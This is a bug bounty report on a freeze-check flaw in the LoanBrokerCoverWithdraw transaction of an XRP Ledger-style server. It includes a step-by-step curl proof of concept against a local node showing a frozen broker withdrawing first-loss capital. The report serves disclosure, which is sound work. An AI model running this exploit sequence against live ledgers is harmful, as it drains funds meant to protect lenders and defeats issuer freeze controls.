# Title
LoanBrokerCoverWithdraw ignores issuer freeze on destination, enabling frozen accounts to siphon first-loss capital

# Description

## Brief/Intro
`LoanBrokerCoverWithdraw` lets a broker owner withdraw first-loss capital to any destination even when the issuer has frozen that destination's trust line. A frozen broker can therefore siphon cover directly, bypassing quarantine controls and causing direct fund loss.

## Vulnerability Details
- `LoanBrokerCoverWithdraw::preclaim` verifies that the pseudo-account can send (`checkFrozen` on the source) but only calls `checkDeepFrozen` on the destination, so normal freeze flags (`lsfLowFreeze`/`lsfHighFreeze`) are ignored (*src/xrpld/app/tx/detail/LoanBrokerCoverWithdraw.cpp*, lines 100-140).
- In `doApply`, both branches transfer funds without rechecking freeze state: the direct `accountSend` path covers self-payments/XRP, and the payment-engine path covers IOUs and MPTs. Neither branch invokes `checkFreeze` before sending (*src/xrpld/app/tx/detail/LoanBrokerCoverWithdraw.cpp*, lines 164-200).
- The ledger helpers (`accountSend`, `rippleCreditIOU`) assume freeze validation occurred beforehand. Once `LoanBrokerCoverWithdraw` calls `accountSend`, the transfer succeeds even when the issuer froze the recipient (*src/libxrpl/ledger/View.cpp*, lines 1908-2049).
- Expected behaviour: issuer freezes should block withdrawals to frozen accounts or redirect payouts back into cover. Actual behaviour: the transaction reports `tesSUCCESS`, moves funds to the frozen account, and the pseudo-account balance decreases accordingly.

## Impact Details
- A frozen broker owner (or collaborator) can withdraw first-loss capital to the frozen account, draining the buffer that was meant to absorb borrower defaults.
- Issuer quarantine controls are ineffective; freeze flags no longer stop value extraction.
- In-scope impacts satisfied: `Drainage and/or stealing of funds from ledger objects (vault, first loss capital)` and `Direct loss of funds`.

## References
- `src/xrpld/app/tx/detail/LoanBrokerCoverWithdraw.cpp`
- `src/libxrpl/ledger/View.cpp`

# Proof of Concept

1. **Create deterministic accounts** (issuer `I`, broker owner `B`, borrower `U`):
   ```sh
   curl -s -X POST http://127.0.0.1:5005 -d '{"method":"wallet_propose","params":[{"passphrase":"issuer freeze demo"}]}'
   curl -s -X POST http://127.0.0.1:5005 -d '{"method":"wallet_propose","params":[{"passphrase":"broker freeze demo"}]}'
   curl -s -X POST http://127.0.0.1:5005 -d '{"method":"wallet_propose","params":[{"passphrase":"borrower freeze demo"}]}'
   ```
2. **Fund each account** from genesis so they can pay fees:
   ```sh
   for acct in <ISSUER_ACCOUNT> <BROKER_ACCOUNT> <BORROWER_ACCOUNT>; do
     curl -s -X POST http://127.0.0.1:5005 -d "{\
       \"method\":\"submit\",\
       \"params\":[{\
         \"secret\":\"snoPBrXtMeMyMHUVTgbuqAfg1SUTb\",\
         \"tx_json\":{\
           \"TransactionType\":\"Payment\",\
           \"Account\":\"rHb9CJAWyB4rj91VRWn96DkukG4bwdtyTh\",\
           \"Destination\":\"$acct\",\
           \"Amount\":\"1000000000\"\
         }\
       }]\
     }" | jq '.result.engine_result'
   done
   ```
3. **Set up trust lines and mint IOUs** so the pseudo-account can hold cover:
   ```sh
   # Broker trust line to issuer IOU
   curl -s -X POST http://127.0.0.1:5005 -d '{
     "method":"submit",
     "params":[{
       "secret":"<BROKER_SECRET>",
       "tx_json":{
         "TransactionType":"TrustSet",
         "Account":"<BROKER_ACCOUNT>",
         "LimitAmount":{
           "currency":"USD",
           "issuer":"<ISSUER_ACCOUNT>",
           "value":"1000000000000"
         },
         "Flags":262144
       }
     }]
   }' | jq '.result.engine_result'

   # Borrower trust line (needed later)
   curl -s -X POST http://127.0.0.1:5005 -d '{
     "method":"submit",
     "params":[{
       "secret":"<BORROWER_SECRET>",
       "tx_json":{
         "TransactionType":"TrustSet",
         "Account":"<BORROWER_ACCOUNT>",
         "LimitAmount":{
           "currency":"USD",
           "issuer":"<ISSUER_ACCOUNT>",
           "value":"1000000000000"
         }
       }
     }]
   }' | jq '.result.engine_result'

   # Issuer supplies IOUs to broker owner
   curl -s -X POST http://127.0.0.1:5005 -d '{
     "method":"submit",
     "params":[{
       "secret":"<ISSUER_SECRET>",
       "tx_json":{
         "TransactionType":"Payment",
         "Account":"<ISSUER_ACCOUNT>",
         "Destination":"<BROKER_ACCOUNT>",
         "Amount":{
           "currency":"USD",
           "issuer":"<ISSUER_ACCOUNT>",
           "value":"5000000"
         },
         "Flags":131072
       }
     }]
   }' | jq '.result.engine_result'
   ```
4. **Create the vault and loan broker, then deposit cover:**
   ```sh
   VAULT_HASH=$(curl -s -X POST http://127.0.0.1:5005 -d '{
     "method":"submit",
     "params":[{
       "secret":"<BROKER_SECRET>",
       "tx_json":{
         "TransactionType":"VaultCreate",
         "Account":"<BROKER_ACCOUNT>",
         "Asset":{
           "currency":"USD",
           "issuer":"<ISSUER_ACCOUNT>"
         },
         "Scale":6
       }
     }]
   }' | jq -r '.result.tx_json.hash')

   VAULT_ID=$(curl -s -X POST http://127.0.0.1:5005 -d '{
     "method":"tx",
     "params":[{"transaction":"'"$VAULT_HASH"'"}]
   }' | jq -r '.result.meta.AffectedNodes[] | select(.CreatedNode? and .CreatedNode.LedgerEntryType=="Vault").CreatedNode.LedgerIndex')

   BROKER_HASH=$(curl -s -X POST http://127.0.0.1:5005 -d '{
     "method":"submit",
     "params":[{
       "secret":"<BROKER_SECRET>",
       "tx_json":{
         "TransactionType":"LoanBrokerSet",
         "Account":"<BROKER_ACCOUNT>",
         "VaultID":"'"$VAULT_ID"'",
         "CoverRateMinimum":1
       }
     }]
   }' | jq -r '.result.tx_json.hash')

   BROKER_ID=$(curl -s -X POST http://127.0.0.1:5005 -d '{
     "method":"tx",
     "params":[{"transaction":"'"$BROKER_HASH"'"}]
   }' | jq -r '.result.meta.AffectedNodes[] | select(.CreatedNode? and .CreatedNode.LedgerEntryType=="LoanBroker").CreatedNode.LedgerIndex')

   curl -s -X POST http://127.0.0.1:5005 -d '{
     "method":"submit",
     "params":[{
       "secret":"<BROKER_SECRET>",
       "tx_json":{
         "TransactionType":"LoanBrokerCoverDeposit",
         "Account":"<BROKER_ACCOUNT>",
         "LoanBrokerID":"'"$BROKER_ID"'",
         "Amount":{
           "currency":"USD",
           "issuer":"<ISSUER_ACCOUNT>",
           "value":"1000000"
         }
       }
     }]
   }' | jq '.result.engine_result'
   ```
5. **Freeze the broker owner’s trust line** and confirm the flag:
   ```sh
   curl -s -X POST http://127.0.0.1:5005 -d '{
     "method":"submit",
     "params":[{
       "secret":"<ISSUER_SECRET>",
       "tx_json":{
         "TransactionType":"TrustSet",
         "Account":"<ISSUER_ACCOUNT>",
         "LimitAmount":{
           "currency":"USD",
           "issuer":"<BROKER_ACCOUNT>",
           "value":"0"
         },
         "Flags":1048576
       }
     }]
   }' | jq '.result.engine_result'

   curl -s -X POST http://127.0.0.1:5005 -d '{
     "method":"account_lines",
     "params":[{"account":"<BROKER_ACCOUNT>","peer":"<ISSUER_ACCOUNT>"}]
   }' | jq '.result.lines[0].freeze'
   ```
   The last command returns `true`, confirming that the trust line is frozen.

6. **Withdraw cover to the frozen account**
   ```sh
   curl -s -X POST http://127.0.0.1:5005 -d '{
     "method":"submit",
     "params":[{
       "secret":"<BROKER_SECRET>",
       "tx_json":{
         "TransactionType":"LoanBrokerCoverWithdraw",
         "Account":"<BROKER_ACCOUNT>",
         "LoanBrokerID":"'"$BROKER_ID"'",
         "Amount":{
           "currency":"USD",
           "issuer":"<ISSUER_ACCOUNT>",
           "value":"500000"
         },
         "Destination":"<BROKER_ACCOUNT>"
       }
     }]
   }' | jq '.result.engine_result'
   ```
   Result: `tesSUCCESS` even though the destination trust line is frozen.

7. **Observe the invariant break**
   ```sh
   curl -s -X POST http://127.0.0.1:5005 -d '{
     "method":"account_lines",
     "params":[{"account":"<BROKER_ACCOUNT>","peer":"<ISSUER_ACCOUNT>"}]
   }' | jq '.result.lines[0].balance'

   curl -s -X POST http://127.0.0.1:5005 -d '{
     "method":"ledger_entry",
     "params":[{"index":"'"$BROKER_ID"'"}]
   }' | jq '.result.node.CoverAvailable'
   ```
   The trust line balance increases by `500000` while `sfCoverAvailable` decreases by the same amount, demonstrating that the frozen account successfully siphoned first-loss capital.
